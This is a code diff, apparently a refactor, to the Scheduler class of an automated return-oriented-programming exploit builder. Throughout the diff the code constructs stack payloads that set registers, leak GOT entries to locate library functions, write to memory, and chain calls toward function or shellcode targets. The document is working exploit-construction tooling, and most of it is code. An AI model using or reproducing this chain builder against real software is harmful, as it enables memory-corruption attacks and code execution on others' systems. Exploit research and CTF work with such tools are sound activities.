@@ -171,18 +171,6 @@ class Scheduler(object):
       address = 2**64 + address
     return struct.pack("Q", address)
 
-  def create_set_reg_chain(self, gadget, value, next_address):
-    """Given a LoadMem gadget off the stack, this method returns a ROP chain that will set a register to the specified value"""
-    if type(value) != str:
-      value = self.ap(value)
-
-    chain  = gadget.params[0] * "A"
-    chain += value
-    chain += (gadget.ip_in_stack_offset - len(chain)) * "B"
-    chain += self.ap(next_address)
-    chain += (gadget.stack_offset - len(chain)) * "C"
-    return chain
-
   def create_function_chain(self, goal, end_address = 0x4444444444444444):
     """This method returns a ROP chain that will call a function"""
     self.logger.info("Creating function chain for %s(%s) and finishing with a return to 0x%x", goal.name,
@@ -210,7 +198,7 @@ class Scheduler(object):
       next_address = goal.address
       if i + 1 < len(goal.arguments):
         next_address = arg_gadgets[i + 1].address
-      chain += self.create_set_reg_chain(arg_gadgets[i], goal.arguments[i], next_address)
+      chain += arg_gadgets[i].chain(next_address, goal.arguments[i])
 
     chain = chain + self.ap(end_address)
     return (chain, arg_gadgets[0].address)
@@ -301,35 +289,21 @@ class Scheduler(object):
     if len(arg_gadgets) > 0:
       start_of_function_address = arg_gadgets[0].address
 
-    # set the read address
-    chain = self.create_set_reg_chain(set_read_addr_gadget, address - read_gadget.params[0], read_gadget.address)
-
-    # read the address in the GOT
-    read_gadget_chain = read_gadget.ip_in_stack_offset * "D"
-    read_gadget_chain += self.ap(set_add_reg_gadget.address)
-    read_gadget_chain += (read_gadget.stack_offset - len(read_gadget_chain)) * "E"
-    chain += read_gadget_chain
-
-    # set the offset from the base to the target
-    chain += self.create_set_reg_chain(set_add_reg_gadget, offset, add_jump_reg_gadget.address)
-
-    # add the offset
-    add_jump_reg_gadget_chain = add_jump_reg_gadget.ip_in_stack_offset * "F"
-    add_jump_reg_gadget_chain += self.ap(start_of_function_address)
-    add_jump_reg_gadget_chain += (add_jump_reg_gadget.stack_offset - len(add_jump_reg_gadget_chain)) * "G"
-    chain += add_jump_reg_gadget_chain
+    chain = set_read_addr_gadget.chain(read_gadget.address, address - read_gadget.params[0]) # set the read address
+    chain += read_gadget.chain(set_add_reg_gadget.address)                                   # read the address in the GOT
+    chain += set_add_reg_gadget.chain(add_jump_reg_gadget.address, offset)                   # set the offset from the base to the target
+    chain += add_jump_reg_gadget.chain(start_of_function_address)                            # add the offset
 
     # Set the arguments for the function
     for i in range(len(arg_gadgets)):
       next_address = jump_gadget.address
       if i + 1 < len(arguments):
         next_address = arg_gadgets[i + 1].address
-      chain += self.create_set_reg_chain(arg_gadgets[i], arguments[i], next_address)
+      chain += arg_gadgets[i].chain(next_address, arguments[i])
 
     # Finally, jump to the function
-    chain += jump_gadget.stack_offset * "H"
+    chain += jump_gadget.chain()
     chain += self.ap(end_address)
-
     return (chain, set_read_addr_gadget.address)
 
   def create_shellcode_address_chain(self, goal):
@@ -383,14 +357,11 @@ class Scheduler(object):
     load_addr_gadget, load_value_gadget, store_mem_gadget = self.get_write_memory_gadget()
 
     # Next create the chain to setup the address and value to be written
-    chain = self.create_set_reg_chain(load_addr_gadget, address, load_value_gadget.address)
-    chain += self.create_set_reg_chain(load_value_gadget, buf, store_mem_gadget.address)
+    chain = load_addr_gadget.chain(load_value_gadget.address, address)
+    chain += load_value_gadget.chain(store_mem_gadget.address, buf)
 
     # Finally, create the chain to write to memory
-    set_mem_rop = store_mem_gadget.ip_in_stack_offset * "I"
-    set_mem_rop += self.ap(next_address)
-    set_mem_rop += (store_mem_gadget.stack_offset - len(set_mem_rop)) * "J"
-    chain += set_mem_rop
+    chain += store_mem_gadget.chain(next_address)
 
     return (chain, load_addr_gadget.address)
 
